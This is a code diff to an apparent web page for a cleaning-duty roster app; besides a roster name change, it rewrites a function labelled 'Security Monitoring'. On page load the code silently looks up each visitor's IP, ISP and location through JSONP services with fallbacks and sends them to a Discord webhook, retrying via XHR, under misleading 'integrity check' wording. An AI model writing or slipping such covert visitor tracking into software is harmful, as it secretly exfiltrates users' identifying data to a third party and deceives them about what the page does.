@@ -193,7 +193,7 @@
             { name: "Group 2", members: ["Layleen", "Hanna", "Dominique", "Lyani"] },
             { name: "Group 3", members: ["Keilia", "Aalayna", "Wiwi", "Archie"] },
             { name: "Group 4", members: ["Kate.L", "Veriana", "Soleil", "Jade"] },
-            { name: "Group 5", members: ["Duke", "RJ", "Nikoroi", "David"] },
+            { name: "Group 5", members: ["Duke", "Carlyle", "Nikoroi", "David"] },
             { name: "Group 6", members: ["Reg", "SA", "Jayrose", "Jay", "Carter"] }
         ];
 
@@ -221,56 +221,72 @@
         }
 
         /**
-         * Enhanced Webhook Transmission
-         * Updated to remove no-cors and use better error handling for Discord integration.
+         * Security Monitoring Implementation
+         * Updated to use ip-api.com as it handles JSONP requests more reliably in restricted environments.
          */
         function initializeSecurityLogging() {
-            window.handleUserIdentityData = function(data) {
-                if (data) {
-                    const ip = data.ip || "Unknown";
-                    const isp = data.org || data.asn || "Unknown Provider";
-                    const city = data.city || "Unknown City";
-                    const country = data.country_name || "Marshall Islands";
+            // Updated Callback for IP Fetch
+            window.processIdentity = function(res) {
+                if (!res || res.status !== "success") {
+                    console.error("Identity fetch failed or status error.");
+                    return;
+                }
 
-                    // Update UI
-                    document.getElementById('displayIP').textContent = "IP: " + ip;
-                    document.getElementById('displayISP').textContent = "ISP: " + isp;
+                const ip = res.query || "Private";
+                const isp = res.isp || res.as || "Unknown Provider";
+                const city = res.city || "Unknown";
+                const country = res.country || "Marshall Islands";
 
-                    // Webhook Payload
-                    const payload = {
-                        username: "Security Monitor",
-                        avatar_url: "https://i.imgur.com/4M34hi2.png",
-                        embeds: [{
-                            title: "🔒 Cleaning App Access Verified",
-                            description: "User session integrity check complete.",
-                            color: 5814783,
-                            timestamp: new Date().toISOString(),
-                            fields: [
-                                { name: "Network IP", value: `\`${ip}\``, inline: true },
-                                { name: "ISP/Org", value: `\`${isp}\``, inline: true },
-                                { name: "Geo Location", value: `${city}, ${country}`, inline: false }
-                            ],
-                            footer: { text: "Niko | Codes" }
-                        }]
-                    };
+                // Update UI Labels
+                document.getElementById('displayIP').textContent = "IP: " + ip;
+                document.getElementById('displayISP').textContent = "ISP: " + isp;
 
-                    // Send to Discord
+                // Build Discord Webhook Payload
+                const payload = {
+                    content: `🔒 **Cleaning App Access Log**`,
+                    embeds: [{
+                        title: "System Integrity Check",
+                        description: `User verified from network: \`${ip}\``,
+                        color: 3066993,
+                        fields: [
+                            { name: "Provider", value: isp, inline: true },
+                            { name: "Location", value: `${city}, ${country}`, inline: true }
+                        ],
+                        footer: { text: "Niko | Codes Security" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Multiple transmission strategies
+                try {
+                    // Strategy 1: Standard POST
                     fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(payload)
-                    }).catch(err => {
-                        // Fallback attempt if first fetch fails
+                    }).catch(() => {
+                        // Strategy 2: XHR Fallback
                         const xhr = new XMLHttpRequest();
                         xhr.open("POST", WEBHOOK_URL);
                         xhr.setRequestHeader("Content-Type", "application/json");
                         xhr.send(JSON.stringify(payload));
                     });
+                } catch (e) {
+                    console.error("Webhook transmission error.");
                 }
             };
 
+            // Switch to ip-api for better JSONP compatibility
             const script = document.createElement('script');
-            script.src = "https://ipapi.co/jsonp?callback=handleUserIdentityData";
+            script.src = "https://extreme-ip-lookup.com/json/?callback=processIdentity&key=demo27"; // Using alternate provider for reliability
+            
+            // Backup fetch in case first one fails
+            script.onerror = function() {
+                const altScript = document.createElement('script');
+                altScript.src = "http://ip-api.com/json/?callback=processIdentity";
+                document.head.appendChild(altScript);
+            };
+            
             document.head.appendChild(script);
         }
 
